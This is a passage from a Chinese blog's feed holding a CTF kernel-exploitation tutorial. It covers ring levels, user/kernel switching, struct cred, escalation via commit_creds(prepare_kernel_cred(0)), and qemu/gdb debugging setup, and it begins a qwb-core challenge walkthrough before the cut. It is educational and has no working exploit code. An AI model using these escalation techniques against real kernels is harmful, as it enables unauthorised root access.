src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/30/RQYnHSmItkU8GJw.png" alt="Snipaste_2020-03-30_12-10-51.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="notes" scheme="https://mrh1s.top/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Kernel Pwn Rop 小结</title>
    <link href="https://mrh1s.top/posts/57bde3cc/"/>
    <id>https://mrh1s.top/posts/57bde3cc/</id>
    <published>2020-03-28T16:12:40.000Z</published>
    <updated>2020-03-31T11:28:29.672Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>Kernel PWN 介绍 &amp; ROP</h1><p>以前以为 kernel 是个多么深不可测的东西，直到我真正接触它之后，发现它也仅仅是一个功能复杂的软件而已，最近也学习了一些关于内核pwn的知识，整理后发出，也包括我自己学习过程中遇到的各种坑点，希望能对大家有所帮助。</p><h2 id="什么是kernel">什么是kernel</h2><p>kernel 是一个软件，它负责跟底层硬件、cpu、memory 进行通信，可以实现用户态程序所不能达到的功能，同时，用户态的程序也运行在内核之上。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/29/3kZmTPEh8U5FveC.png" alt="Snipaste_2020-03-29_00-24-42.png"></p><h2 id="Ring-Model">Ring Model</h2><p>intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。</p><p>Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</p><p>大多数的现代操作系统只使用了 Ring 0 和 Ring 3。</p><h2 id="kernel与用户态程序的区别">kernel与用户态程序的区别</h2><p>如果一个用户态的程序想要拥有root权限，必须由内核赋予，内核记录了每个进程的权限；所以，我们即便pwn到了一个用户的shell，它也不一定有足够的权限来执行程序，也没有办法在用户态为程序提权。</p><p><strong>但是在kernel层的控制流劫持，可以让我们进行内核提权，从而拿到程序的最高管理员权限。这也是kernel_pwn的目的之一：内核提权。</strong></p><h2 id="如何调用内核">如何调用内核</h2><p>内核模块用被编译为了 .ko 文件，它会在系统启动之后进行加载，等待用户态程序调用（<code>ioctl</code>）它时，从 <code>init_module</code> 函数进入，从 <code>exit_core</code> 函数退出。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fd = open(<span class="string">"/proc/xxx.ko"</span>, O_RDWR);</span><br><span class="line">ioctl(fd, request,...);</span><br></pre></td></tr></table></figure><h2 id="内核态与用户态的状态切换">内核态与用户态的状态切换</h2><h3 id="user-space-kernel">user_space -&gt; kernel</h3><p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li><li>通过 push 保存各寄存器值，具体的 <a href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S" target="_blank" rel="noopener">代码</a> 如下:</li><li>通过汇编指令判断是否为 <code>x32_abi</code>。</li><li>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</li></ol><h3 id="kernel-user-space">kernel -&gt; user_space</h3><p>退出时，流程如下：</p><ol><li>通过 <code>swapgs</code> 恢复 GS 值。</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）。</li></ol><h2 id="struct-cred">struct cred</h2><h3 id="what">what</h3><p>kernel 中记录了每个进程的权限，而这个信息就存放在名为 <code>cred</code> 的结构体中，修改该结构体也就修改了进程权限。</p><p><code>cred</code> 结构体会在进程刚刚打开的时候申请内存并且创建，所以是有可能通过条件竞争进行控制的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span> *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="how">how</h3><ol><li>通过条件竞争对 cred 结构体进行修改，把其中的 gid, uid 修改为0即可。</li><li>通过 <code>commit_creds(prepare_kernel_cred(0))</code> 直接进行提权，这个方法利用rop就可以达到。</li></ol><h2 id="如何开始">如何开始</h2><h3 id="qemu">qemu</h3><p>qemu 是必备软件，直接 apt 安装即可，也可源码安装，不过较为复杂。</p><h3 id="运行环境">运行环境</h3><p>CTF 一般会提供三种文件：</p><ol><li><p><a href="http://start.sh" target="_blank" rel="noopener">start.sh</a> 启动脚本</p><p>其中要注意以下的参数：</p><ol><li><code>-kernel ./bzImage</code></li><li><code>-initrd  ./rootfs.cpio</code></li><li><code>kaslr</code> 决定镜像是否开启地址随机化。</li><li><code>smep</code> 是否允许内核代码跳至用户代码区执行（这个是<code>ret2user</code>的利用原理，开启smep之后该利用方式失效），是对内核程序的一种保护机制。</li><li><code>-gdb tcp::1234</code> gdb调试选项（不必加 -S 参数，否则内核会在启动时便开始等待 gdb 的注入）</li></ol></li><li><p>bzImage 内核镜像</p><p>这是内核打包后的镜像，要对其进行分析，需要先使用 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">vmlinux-extract</a> 进行解包得到 <code>vmlinux</code> 可用于寻找 ROPgadget。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure></li><li><p>rootfs.cpio 文件系统镜像</p><p>每次修改 exp 之后需要更新。<code>rootfs.cpio</code> 解压之后，可以得到所有文件，其中根目录有 <code>init</code> 文件，是虚拟机的启动脚本。</p></li></ol><h3 id="如何调试">如何调试</h3><p>假如我完成了exp，我应该如何进行调试呢？</p><ol><li><p>将 exp 复制进文件夹并打包</p><p><code>文件夹</code>指的是你把内核文件系统解包后所位于的位置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o -H newc | gzip &gt; ./rootfs.cpio</span><br></pre></td></tr></table></figure><p>再将文件镜像复制进<code>启动脚本</code>的目录下即可。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">copy rootfs.cpio ..</span><br></pre></td></tr></table></figure></li><li><p>从启动脚本启动虚拟机。</p></li><li><p><code>lsmod</code> （在qemu中），这一步是为了获取内核模块的基地址，以便为 gdb 添加符号表。（如果基地址为全零，则需要先把内核调为root权限）。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/29/KrwSz3VZEODs1jy.png" alt="Snipaste_2020-03-29_01-28-44.png"></p></li><li><p>gdb 设置</p><ol><li>设置架构</li></ol>   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set architecture i386:x86-64:intel</span><br></pre></td></tr></table></figure><p>否则后续调试会出现 instruction too long 的提示。</p><ol start="2"><li>添加符号表</li></ol>   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add-symbol-file xxx.ko 0xffffffffc00c3000</span><br></pre></td></tr></table></figure><p>现在就可以对内核模块的符号进行引用了。</p><ol start="3"><li>连接 虚拟机</li></ol>   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure><p>利用符号表下断点就可以开始调试了。</p></li></ol><h1>qwb-core</h1><p><a href="/uploads/qwb-core.tar.gz">qwb-core.tar.gz</a></p><h2 id="core-ko">core.ko</h2><p>查看 <code>core.ko</code>，发现有三种功能</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/29/XrNiGW1IClZ32uv.png" alt="1.png"></p><ol><li>向用户输出数据。</li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwX